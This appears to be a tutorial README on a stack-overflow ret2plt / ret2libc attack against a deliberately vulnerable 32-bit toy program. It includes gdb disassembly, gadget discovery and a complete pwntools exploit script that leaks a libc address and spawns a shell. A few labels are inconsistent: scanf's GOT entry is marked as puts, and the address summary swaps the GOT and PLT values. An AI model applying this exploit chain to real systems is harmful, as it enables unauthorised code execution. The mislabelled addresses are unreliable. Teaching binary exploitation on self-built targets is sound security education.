# EXPLOITS
## STACK BUFFER OVERFLOW FOR Ret2plt or BLIND RETURN TO LIBC (bRet2libc) by leak of libc
## REQUIRED TO UNDERSTAND : STACK BUFFER OVERFLOW FOR RETURN TO LIBC (ret2libc) and STACK BUFFER OVERFLOW FOR RETURN ORIENTED PROGRAMMING (ROP)
## Can't work if : 
```
> PIE is enabled
```
## Bypasses protection :
```
> NX (non executable) because we're not executing any shellcode
> ASLR (address space layout randomization) because we will leak the address
```
Okay, to figure out what brought us here, you should have understand how return oriented programming and normal ret2libc attack works  
So actually, this attack is a normal ret2libc attack but without knowing the address of the target libc function we wanna execute, actually, the goal is to guess it then do a ret2libc  
Okay so here are the steps :
  1. Leak the address of `scanf()` using `puts()` by getting the real address of `scanf()` using it's GOT (Global Offset Table) address using `puts()` from PLT (Procedure Linkage Table)
  2. Once we have the real `scanf()` address from libc, we can calculate the address of `system()` using the offset that separates `scanf()` and `system()` in libc
  3. We can do a normal ret2libc using the address of `system()` calculate before

Okay let's look a simple example source code :
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>

void vuln()
{
  char buffer[64];
  printf("Enter a string : \n");
  scanf("%s",buffer);
}
int main(int argc, char **argv)
{
  vuln();
}
```
Simple, the `printf()` we have before `scanf()` will be used to get the GOT address of `printf()` but actually, for optimisation reasons, the compiler will replace `print()` with `puts()`  
So let's compile it :
```
gcc <source code file.c> -o <executable> -fno-stack-protector -m32 -no-pie
```
Okay now let's look at the assembler code using gdb :
```
gdb <executable>
# (GDB)>
disass vuln
```
```asm
Dump of assembler code for function vuln:
   0x080491b6 <+0>:	endbr32 
   0x080491ba <+4>:	push   ebp
   0x080491bb <+5>:	mov    ebp,esp
   0x080491bd <+7>:	push   ebx
   0x080491be <+8>:	sub    esp,0x44
   0x080491c1 <+11>:	call   0x80490f0 <__x86.get_pc_thunk.bx>
   0x080491c6 <+16>:	add    ebx,0x2e3a
   0x080491cc <+22>:	sub    esp,0xc
   0x080491cf <+25>:	lea    eax,[ebx-0x1ff8]
   0x080491d5 <+31>:	push   eax
   0x080491d6 <+32>:	call   0x8049070 <puts@plt>
   0x080491db <+37>:	add    esp,0x10
   0x080491de <+40>:	sub    esp,0x8
   0x080491e1 <+43>:	lea    eax,[ebp-0x48]
   0x080491e4 <+46>:	push   eax
   0x080491e5 <+47>:	lea    eax,[ebx-0x1fe6]
   0x080491eb <+53>:	push   eax
   0x080491ec <+54>:	call   0x8049090 <__isoc99_scanf@plt>
   0x080491f1 <+59>:	add    esp,0x10
   0x080491f4 <+62>:	nop
   0x080491f5 <+63>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080491f8 <+66>:	leave  
   0x080491f9 <+67>:	ret    
End of assembler dump.
```
We can see a call to `puts()` from PLT which prints "Enter a string : \n" then a call to `scanf()` from PLT  
To build our exploit we need 4 informations :   
* Address of `scanf()` in GOT
* Address of `puts()` in PLT 
* The `main()` function address
* And the address of a gadget : `pop ebx`
With this line we have informations about `puts()` we need :
```
0x080491d6 <+32>:	call   0x8049070 <puts@plt>
```
So we have the address of `puts()` in PLT which is `0x8049070` here (1/4)  
And here the PLT of `scanf()` :
```
0x080491ec <+54>:	call   0x8049090 <__isoc99_scanf@plt>
```
To find the address of `scanf()` we need to disassemble the function itself :
```
disass 0x8049090
```
```
Dump of assembler code for function __isoc99_scanf@plt:
   0x08049090 <+0>:	endbr32 
   0x08049094 <+4>:	jmp    DWORD PTR ds:0x804c014 <------ ADDRESS OF PUTS@GOT
   0x0804909a <+10>:	nop    WORD PTR [eax+eax*1+0x0]
End of assembler dump.
```
So we now that `0x804c014` is the address of `puts()` in the GOT (2/4)  
Next we need the `main()` function address :
```
x main
```
```
0x80491fa <main>:	0xfb1e0ff3
```
`0x80491fa` is the address of the `main()` function (3/4)  
Finally, we just need a gagdet that pops ebx which is ...surprise... `pop ebx` !  
To get it we can use ROPgadget :
```
ROPgadget --binary <executable> | grep "pop ebx"
```
```
0x08049022 : pop ebx ; ret
```
`pop ebx` : `0x08049022` (4/4)  
Now let's build the exploit, this time we're gonna use a tool called pwntools in python wich gathers a lot of functions that are useful for exploitation, you're probably asking yourself why we're not just using python normally, that's because it will leak the address of `scanf()` and we need to use it  
To install pwntools : `pip install pwntools` (if you have any problems with the installation please ask them here)  
Now let's have the exploit, so the addresses we gathered are :
* Address of `scanf()` in GOT : `0x8049070`
* Address of `puts()` in PLT : `0x804c014`
* The `main()` function address : `0x80491fa`
* Address of `pop ebx` gadget : `0x08049022`
So the exploit.py :
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import struct

context(arch='i386')
p = 0
libc = ELF('/lib32/libc.so.6') # Open the libc file to get all addresses
global p, libc

def wait(until):
    buf = p.recvuntil(until)
    return buf

pop_gadget = 0x08049022  # pop ebx ; ret (got using ROPgadget --binary <exec> | grep "pop ebx ; ret")
gotscanf = 0x804c014 # scanf@GOT
pltputs = 0x8049070 # puts@PLT
addrmain = 0x080491fa # main()
input_msg = "Enter a string :" # Message which is printed before the input with puts()

print "[Debug] : scanf@got : " + str(hex(gotscanf))
print "[Debug] : puts@plt : " + str(hex(pltputs))
print "[Debug] : main() address : " + str(hex(addrmain))

p = process('./vuln') # Starting program

wait(input_msg) # Wait for the message to be printed
"""
So here is the step 1 : We call puts@plt (basically just puts() because calling a function from plt is just calling the function itself) with the address of scanf@GOT as argument then we return to main(), so a pseudo representation in C would be :
puts(scanf@GOT);
main();
By doing this, it will print the real address of scanf()
"""
log.info("[Exploit] : Building ROPchain...")
payload = "a"*<OFFSET BEFORE OVERWRITING EIP BACKUP> # For me it's 76
payload += p32(pltputs) # We call puts@plt (puts())
payload += p32(pop_gadget) # pop ebx
payload += p32(gotscanf) # We pass the first argument which is scanf@GOT
payload += p32(addrmain) # Then we return to main when the function ends

log.info("[Exploit] : Sending ROPchain...")
p.sendline(payload) # Send the payload
leak = wait(input_msg) # We wait it to print "Enter a string : \n" then we get the result that puts have printed due to the ropchain we built earlier
leak_scanf = u32(leak[2:6]) # We unpack the address to convert ascci string to hex address
log.success("[Exploit] : Leaked address of scanf() : " + str(hex(leak_scanf))) # And then we show the address we got

"""
Step 2 : We can do some calculations to get the libc base and system() addresses using the real address of scanf() we just got
"""

leak_libc_base = leak_scanf - libc.symbols["__isoc99_scanf"] # We substract the real address of scanf by the address of scanf in libc to get the libc base
log.success("[Exploit] : Leaked libc base : " + str(hex(leak_libc_base)))

"""
Now let's search for the system() address in libc
We're not gonna use system(), because, it contains a 0x20 which is a space (for me in any case), but we can use execve that will execute any program, so here "/bin/sh"
"""
leak_execve = leak_libc_base + libc.symbols['execve'] # get the execve() function real address
leak_system = leak_libc_base + libc.symbols['system'] # we're not gonna use system
leak_binsh = leak_libc_base + next(libc.search('/bin/sh\x00')) # We're gonna search for "/bin/sh" in libc, because it exists

log.success("[Exploit] : Leaked address of execve() : " + str(hex(leak_execve)))
log.success("[Exploit] : Leaked address of system() (not used) : " + str(hex(leak_system)))
log.success("[Exploit] : Leaked address /bin/sh in libc : " + str(hex(leak_binsh)))
log.info("[Exploit] : Building payload for ret2libc calling system")
payload = "a"*<OFFSET BEFORE OVERWRITING EIP BACKUP> # For me it's 76

"""
Step 3 : Now that we have all the addresses we need, we can do a simple return to libc
"""

payload += p32(leak_execve) # We call execve
payload += p32(pop_gadget) # pop ebx
payload += p32(leak_binsh) # With the "/bin/sh" argument
payload += "\x00"*4 # Not used argument so we can just pass a null address
payload += "\x00"*4 # This argument is also not used
log.info("[Exploit] : Sending payload...")

p.sendline(payload) # We send the final payload

p.interactive() 
"""
And we prompt the user like if he was using the program normally, it is equivalent to the the (python exploit.py ; cat) | ./vuln  
Where we used the cat command
"""
p.close() # We close the process
```
And as a normal ret2libc, it should give an interactive shell !  
I have to admit that this attack is really clever, i really like it !  
If you still have any question or if you face any problem, please ask it here, i'll take a pleasure to help you !  
